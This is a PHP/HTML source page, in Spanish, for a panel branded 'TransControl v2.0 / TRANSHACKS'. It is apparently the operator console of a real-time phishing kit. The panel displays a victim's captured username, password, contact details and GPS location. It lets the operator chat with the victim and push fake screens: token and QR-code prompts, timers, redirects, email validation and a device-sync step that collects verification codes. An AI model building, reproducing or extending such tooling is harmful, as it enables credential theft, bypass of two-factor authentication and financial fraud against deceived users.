<?php
require_once __DIR__ . '/../php_config/helpers.php';
if (session_status() === PHP_SESSION_NONE) session_start();
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MifelinS.Control. | Panel dinámico</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/modales_alertas.css">
    <link rel="stylesheet" href="css/panel_dinamico_historial_chat.css?v=20260805a">
    <link rel="stylesheet" href="css/quick_messages.css">
    <link rel="stylesheet" href="css/tooltips.css">
    <link rel="stylesheet" href="css/modales_dinamicos.css?v=20260403e">
    <link rel="stylesheet" href="css/theme_dark.css?v=8">
    <link rel="stylesheet" href="css/theme_light.css?v=7">
    <link rel="stylesheet" href="css/responsive-movil.css?v=20260710">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="js/theme_toggle.js?v=1"></script>
    <style>
        .nick-font {
            font-family: 'Outfit', sans-serif;
            font-weight: 600;
            font-size: 1.1em;
            text-transform: uppercase;
        }
        .bx-control-text {
            background: linear-gradient(90deg,rgb(112, 24, 24),rgb(253, 0, 0),rgb(255, 0, 0));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: inline;
        }
        .version-text {
            font-size: 0.6em;
            color: #9ca3af;
            vertical-align: top;
            font-weight: 400;
            margin-left: 2px;
        }
        .panel-dinamico-brand {
            background: #000;
            border-radius: 12px;
            border: 1px solid rgba(55, 65, 81, 0.85);
            padding: 0.5rem 1rem 0.55rem;
        }
        .panel-dinamico-brand h1 {
            color: #fff;
        }
        .panel-dinamico-brand .version-text {
            color: #a1a1aa;
        }
        .panel-dinamico-brand .panel-dinamico-transhacks {
            color: #d4d4d8;
        }
        .admin-monitoring { margin-top: 8px; font-size: 12px; color: #000; }
        .monitoring-online, .monitoring-history { margin-bottom: 4px; }
        .monitoring-label { font-weight: bold; color: #000; }
        .monitoring-list { color: #000; }
    </style>
</head>
<body class="page-panel-dinamico min-h-screen bg-white text-black">
    <!-- Panel dinámico: marca + ID + tema (sin navegación global ni salir) -->
    <!-- Borde inferior lo define .header-estado-* (verde/ámbar/rojo/gris) -->
    <header class="panel-page-header bg-white text-gray-800 shadow-sm border-b">
        <div class="w-full px-4 sm:px-6 lg:px-8">
            <div class="flex flex-wrap justify-between items-center gap-y-3 py-3">
                <div class="panel-dinamico-brand min-w-0 max-w-full">
                    <h1 class="text-xl font-semibold nick-font leading-tight">
                        <span class="text-white">Trans</span><span class="bx-control-text">Control</span><span class="version-text">v2.0</span>
                    </h1>
                    <p class="panel-dinamico-transhacks text-xs -mt-0.5 tracking-wide"><b>TRANS</b>HACKS</p>
                </div>
                <div class="flex items-center gap-2 sm:gap-3 flex-shrink-0 ml-auto">
                    <div class="bg-red-800 text-white border border-red-600/60 px-3 py-1.5 rounded-lg text-sm font-semibold whitespace-nowrap">
                        ID: <?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : 'N/A'; ?>
                    </div>
                    <button type="button" class="theme-toggle-btn px-3 py-2 rounded-lg text-sm" title="Cambiar tema">
                        <i class="fas fa-moon" aria-hidden="true"></i>
                    </button>
                </div>
            </div>
        </div>
    </header>

    <main class="panel-dinamico-container">
        <div class="panel-content">
            <div class="chat-container">
                <div class="chat-header">
                    <div class="chat-header-info">
                        <h2 class="text-xl font-bold text-gray-800" id="chatTitle">Chat con <span id="chatUserName" class="chat-user-name">Usuario</span></h2>
                        <div class="admin-monitoring" id="adminMonitoring">
                            <div class="monitoring-section">
                                <div class="monitoring-online" id="monitoringOnline">
                                    <span class="monitoring-label">En línea:</span>
                                    <span class="monitoring-list" id="onlineAdminsList">Cargando...</span>
                                </div>
                                <div class="monitoring-history" id="monitoringHistory">
                                    <span class="monitoring-label">Historial:</span>
                                    <span class="monitoring-list" id="historyAdminsList">Cargando...</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="chat-status" id="chatStatus">
                        <div class="status-indicator">
                            <i class="fas fa-circle status-icon" id="statusIcon"></i>
                            <span class="status-text" id="statusText">Cargando...</span>
                        </div>
                    </div>
                </div>
                <div class="chat-messages" id="chatMessages">
                    <div class="chat-empty">
                        <i class="fas fa-comments"></i>
                        <p>No hay mensajes aún</p>
                    </div>
                </div>
                <div class="chat-input-container">
                    <div class="chat-input-wrapper">
                        <input type="text" id="chatInput" class="chat-input" placeholder="Escribe tu mensaje..." maxlength="500">
                        <button id="sendButton" class="chat-send-btn"><i class="fas fa-paper-plane"></i></button>
                        <button id="inputVisibleButton" class="chat-visibility-btn" type="button"><i class="fas fa-eye"></i></button>
                        <button id="enterSendButton" class="chat-enter-btn active" type="button"><i class="fas fa-keyboard"></i></button>
                    </div>
                </div>
            </div>
        </div>

        <div class="historial-chat">
            <div class="historial-header">
                <div class="historial-title">
                    <i class="fas fa-user-edit"></i>
                    <span>Historial de Registro</span>
                </div>
                <div class="historial-actions"></div>
            </div>
                <div class="historial-content">
                    <div class="historial-block historial-collapsible">
                    <div class="historial-message">
                        <div class="message-header historial-collapse-trigger" data-collapse-target="blockUsuarioContacto" role="button" tabindex="0">
                            <span class="message-time">Datos de Usuario / Contacto</span>
                            <span class="historial-collapse-meta">
                                <span class="message-type info">INFO</span>
                                <i class="fas fa-chevron-down historial-collapse-icon"></i>
                            </span>
                        </div>
                        <div class="message-content historial-collapse-body" id="blockUsuarioContacto">
                            <div class="user-data" style="margin-bottom: 12px;">
                                <div class="data-row"><strong>Usuario:</strong> <span id="user-usuario">Cargando...</span></div>
                                <div class="data-row"><strong>Contraseña:</strong> <span id="user-pass">Cargando...</span></div>
                            </div>
                            <div class="contact-data">
                                <div class="data-row"><strong>Nombre:</strong> <span id="contact-nombre">Cargando...</span></div>
                                <div class="data-row"><strong>Email:</strong> <span id="contact-email">Cargando...</span></div>
                                <div class="data-row"><strong>Número Móvil:</strong> <span id="contact-movil">Cargando...</span></div>
                                <div class="data-row"><strong>Número Fijo:</strong> <span id="contact-fijo">Cargando...</span></div>
                                <div class="data-row"><strong>Ubicación GPS:</strong> <span id="contact-gps">Cargando...</span></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="historial-block token-pantalla-block historial-collapsible" id="tokenPantallaBlock" style="display: none;">
                    <div class="historial-message">
                        <div class="message-header historial-collapse-trigger" data-collapse-target="blockTokenPantalla" role="button" tabindex="0">
                            <span class="message-time">Control de Token</span>
                            <span class="historial-collapse-meta">
                                <span class="message-type warning" id="tokenPantallaBadge">ESPERA</span>
                                <i class="fas fa-chevron-down historial-collapse-icon"></i>
                            </span>
                        </div>
                        <div class="message-content historial-collapse-body" id="blockTokenPantalla">
                            <p class="token-pantalla-status" id="tokenPantallaStatus">Usuario en espera en login...</p>
                            <div class="token-pantalla-tipo-row" id="tokenPantallaTipoRow">
                                <strong>Tipo enviado:</strong> <span id="tokenPantallaTipo">—</span>
                            </div>
                            <div class="token-pantalla-actions" id="tokenPantallaActions">
                                <button type="button" class="token-pantalla-btn token-pantalla-btn-normal" id="btnEnviarTokenNormal">
                                    <i class="fas fa-key"></i> Enviar Token
                                </button>
                                <button type="button" class="token-pantalla-btn token-pantalla-btn-qr" id="btnEnviarTokenQrToggle">
                                    <i class="fas fa-qrcode"></i> Enviar QR
                                </button>
                            </div>
                            <div class="token-pantalla-qr-wrap" id="tokenQrUrlWrap" style="display: none;">
                                <label for="tokenQrUrlInput" class="token-pantalla-qr-label">URL imagen QR</label>
                                <input type="url" id="tokenQrUrlInput" class="token-pantalla-qr-input" placeholder="https://ejemplo.com/qr.png">
                                <button type="button" class="token-pantalla-btn token-pantalla-btn-confirm" id="btnConfirmarTokenQr">
                                    <i class="fas fa-paper-plane"></i> Confirmar QR
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="historial-block sync-control-block historial-collapsible is-collapsed" id="syncControlBlock" style="display: none;">
                    <div class="historial-message">
                        <div class="message-header historial-collapse-trigger" data-collapse-target="blockSyncControl" role="button" tabindex="0">
                            <span class="message-time">Sincronización</span>
                            <span class="historial-collapse-meta">
                                <span class="message-type warning" id="syncControlBadge">—</span>
                                <i class="fas fa-chevron-down historial-collapse-icon"></i>
                            </span>
                        </div>
                        <div class="message-content historial-collapse-body" id="blockSyncControl">
                            <p class="token-pantalla-status" id="syncControlStatus">Sin sincronización activa</p>
                            <div class="data-row"><strong>Tipo:</strong> <span id="syncControlTipo">—</span></div>
                            <div class="data-row"><strong>Paso:</strong> <span id="syncControlPaso">—</span></div>
                            <div class="data-row sync-control-codigo-row"><strong>Código recibido:</strong> <span class="sync-code-badge sync-code-badge--empty" id="syncControlCodigo">—</span></div>
                            <div class="data-row"><strong>Ronda:</strong> <span id="syncControlRonda">—</span></div>
                            <div class="sync-control-waiting" id="syncControlWaiting" style="display: none;">
                                <i class="fas fa-hourglass-half" aria-hidden="true"></i>
                                <span>Esperando código del usuario…</span>
                            </div>
                            <div class="token-pantalla-qr-wrap" id="syncQrUpdateWrap" style="display: none;">
                                <label for="syncQrUpdateInput" class="token-pantalla-qr-label">Enviar imagen QR</label>
                                <input type="url" id="syncQrUpdateInput" class="token-pantalla-qr-input" placeholder="https://ejemplo.com/qr-nuevo.png">
                                <p class="sync-qr-hint" style="font-size:11px;color:#6b7280;margin:0 0 8px;">El cliente verá esta imagen QR para escanear e ingresar el código.</p>
                                <button type="button" class="token-pantalla-btn token-pantalla-btn-confirm" id="btnSyncActualizarQr">
                                    <i class="fas fa-sync"></i> Enviar QR
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="historial-block historial-collapsible is-collapsed" id="tokenHistorialBlock" style="display: none;">
                    <div class="historial-message">
                        <div class="message-header historial-collapse-trigger" data-collapse-target="blockTokenAcceso" role="button" tabindex="0">
                            <span class="message-time">Token</span>
                            <span class="historial-collapse-meta">
                                <span class="message-type info">ACCESO</span>
                                <i class="fas fa-chevron-down historial-collapse-icon"></i>
                            </span>
                        </div>
                        <div class="message-content historial-collapse-body" id="blockTokenAcceso">
                            <div class="token-data">
                                <div class="data-row"><strong>(Token) inicio:</strong> <span id="token-inicio-normal">—</span></div>
                                <div class="data-row"><strong>(TokenQR) inicio:</strong> <span id="token-inicio-qr">—</span></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="historial-actions-block">
                    <div class="actions-grid">
                        <div class="action-select">
                            <i class="fas fa-paper-plane"></i>
                            <div class="custom-select">
                                <div class="select-trigger" id="selectTrigger">
                                    <span class="select-text"><center>  Enviar Telas  </center></span>
                                    <i class="fas fa-chevron-down select-arrow"></i>
                                </div>
                                <div class="select-dropdown" id="selectDropdown">
                                    <div class="select-option" data-value="opcion1"><i class="fas fa-tools mr-2"></i>Herramientas</div>
                                    <div class="select-option" data-value="timer"><i class="fas fa-clock mr-2"></i>Reloj de Espera</div>
                                    <div class="select-option" data-value="redireccion"><i class="fas fa-directions mr-2"></i>Redirección</div>
                                    <div class="select-option" data-value="email_validation"><i class="fas fa-envelope mr-2"></i>Validar Email</div>
                                    <div class="select-option token-empresa-option" data-value="token_empresa" style="display: none;"><i class="fas fa-key mr-2"></i>Token Empresas</div>
                                    <div class="select-option token-qr-empresa-option" data-value="token_qr_empresa" style="display: none;"><i class="fas fa-qrcode mr-2"></i>Token QR Empresas</div>
                                    <div class="select-option contacto-empresa-option" data-value="contacto_empresa" style="display: none;"><i class="fas fa-address-card mr-2"></i>Datos de contacto</div>
                                    <div class="select-option sync-dispositivo-option" data-value="sincronizacion" style="display: none;"><i class="fas fa-mobile-alt mr-2"></i>Sincronización</div>
                                </div>
                            </div>
                            <button class="action-send-btn" id="sendTelaBtn"><i class="fas fa-paper-plane"></i></button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <?php require __DIR__ . '/includes/alert_overlay.php'; ?>

    <script>
        window.CONTROL_FOLDER_PATH = '<?php echo CONTROL_FOLDER_NAME; ?>';
        const userId = <?php echo isset($_GET['id']) ? intval($_GET['id']) : 'null'; ?>;
    </script>
    <script src="js/bx_alerts.js?v=1"></script>
    <script src="js/control_dinamico.js?v=20260804sync"></script>
    <script src="js/mensajes_rapidos.js"></script>
    <script src="js/tooltips.js"></script>
    <script>
        function initializeTooltips() {
            if (!window.tooltipManager) return;
            var btns = [
                ['sendButton', 'Enviar mensaje', 'top'],
                ['inputVisibleButton', 'Mostrar input al usuario', 'top'],
                ['enterSendButton', 'Envío con Enter activado', 'top']
            ];
            btns.forEach(function (b) {
                var el = document.getElementById(b[0]);
                if (el) tooltipManager.addTooltip(el, b[1], b[2]);
            });
            var checkQM = setInterval(function () {
                var qm = document.getElementById('quickMessagesButton');
                if (qm && !tooltipManager.tooltips.has(qm)) {
                    tooltipManager.addTooltip(qm, 'Mensajes rápidos', 'top');
                    clearInterval(checkQM);
                }
            }, 100);
            setTimeout(function () { clearInterval(checkQM); }, 5000);
        }
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initializeTooltips);
        } else {
            initializeTooltips();
        }
    </script>
</body>
</html>
